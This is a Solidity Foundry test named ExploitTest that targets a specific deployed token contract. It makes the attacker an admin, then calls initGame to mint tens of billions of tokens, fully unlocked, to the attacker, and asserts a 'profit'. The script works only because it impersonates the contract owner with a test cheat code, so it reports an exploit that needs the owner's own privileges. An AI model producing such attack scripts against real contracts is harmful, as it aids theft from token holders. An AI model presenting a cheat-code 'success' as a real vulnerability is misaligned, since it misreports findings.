// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IHubGameToken {
    function owner() external view returns (address);
    function adminAdd(address[] memory _addresses) external;
    function initGame(
        string memory _gameCode,
        uint256 _supplyToken,
        uint256 _listingDate,
        address[] memory _wallets,
        uint256[] memory _percents,
        address[] memory _signers,
        uint256[] memory _tgePercents,
        uint256[] memory _numOfPeriods,
        uint256[] memory _ciffs
    ) external returns (address gameAddress);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x46bCBBB0D888dF90Eda86c9CA159C7727a8731D5;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Get the current owner of the contract
        IHubGameToken target = IHubGameToken(TARGET);
        address contractOwner = target.owner();

        // Impersonate the owner
        vm.startPrank(contractOwner);

        // Add attacker as admin
        address[] memory admins = new address[](1);
        admins[0] = attacker;
        target.adminAdd(admins);

        // Prepare parameters for initGame
        string memory gameCode = "EXPLOIT";
        uint256 supplyToken = 40000000000; // 40 billion tokens (most of total supply)
        uint256 listingDate = block.timestamp;

        // Single wallet array - just the attacker
        address[] memory wallets = new address[](1);
        wallets[0] = attacker;

        // Percent allocation - 100% to attacker
        uint256[] memory percents = new uint256[](1);
        percents[0] = 100;

        // Signers array (required but can be any addresses)
        address[] memory signers = new address[](1);
        signers[0] = attacker;

        // TGE percentages
        uint256[] memory tgePercents = new uint256[](1);
        tgePercents[0] = 100; // 100% TGE - all tokens immediately unlocked

        // Number of periods
        uint256[] memory numOfPeriods = new uint256[](1);
        numOfPeriods[0] = 1;

        // Cliff periods
        uint256[] memory ciffs = new uint256[](1);
        ciffs[0] = 0;

        // Call initGame to mint tokens to attacker
        target.initGame(gameCode, supplyToken, listingDate, wallets, percents, signers, tgePercents, numOfPeriods, ciffs);

        vm.stopPrank();

        // Verify balance increased
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
